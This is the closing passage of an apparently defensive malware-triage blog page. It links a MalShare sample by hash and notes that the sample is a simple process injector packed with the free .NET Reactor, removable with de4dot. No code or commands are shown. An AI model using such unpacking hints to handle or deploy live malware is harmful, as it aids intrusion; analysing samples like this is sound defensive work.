<p><a href="https://malshare.com/sample.php?action=detail&amp;hash=7142f2f2e3a0e56757d17d174df76b44a5bf41ef76d084c38f123ea660c31ee7">7142f2f2e3a0e56757d17d174df76b44a5bf41ef76d084c38f123ea660c31ee7</a></p>
<ul>
<li>protected with a free version of <a href="https://www.eziriz.com/">.net reactor</a> which can be removed with de4dot </li>
<li>simple process injector </li>
</ul>

</div>
</div>
</div>
</div>



  </div><a class="u-url" href="/delivery/triage/powershell/vbs/dotnet/2023/07/02/multichain-delivery.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
      </div>
      <div class="footer-col">
        <p></p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
